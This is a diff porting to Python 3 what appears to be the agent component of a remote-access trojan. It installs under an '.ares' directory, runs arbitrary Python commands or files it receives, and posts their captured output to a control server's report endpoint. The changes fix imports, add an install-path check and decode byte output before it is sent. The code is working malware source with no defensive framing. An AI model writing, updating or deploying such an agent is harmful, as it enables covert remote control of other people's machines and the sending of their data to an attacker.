@@ -11,7 +11,7 @@ import sys
 import traceback
 import threading
 import uuid
-import StringIO
+from io import StringIO
 import zipfile
 import tempfile
 import socket
@@ -50,10 +50,11 @@ class Agent(object):
             install_dir = self.expand_path('~/.ares')
         elif platform.system() == 'Windows':
             install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+        if not install_dir:
+            return None
         if os.path.exists(install_dir):
             return install_dir
-        else:
-            return None
+        return None
 
     def is_installed(self):
         return self.get_install_dir()
@@ -100,6 +101,11 @@ class Agent(object):
             return
         if not output:
             return
+        if isinstance(output, bytes):
+            try:
+                output = output.decode('utf-8')
+            except Exception:
+                output = output.decode('utf-8', errors='replace')
         if newlines:
             output += "\n\n"
         req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
@@ -123,10 +129,10 @@ class Agent(object):
     @threaded
     def python(self, command_or_file):
         """ Runs a python command or a python file and returns the output """
-        new_stdout = StringIO.StringIO()
+        new_stdout = StringIO()
         old_stdout = sys.stdout
         sys.stdout = new_stdout
-        new_stderr = StringIO.StringIO()
+        new_stderr = StringIO()
         old_stderr = sys.stderr
         sys.stderr = new_stderr
         if os.path.exists(command_or_file):
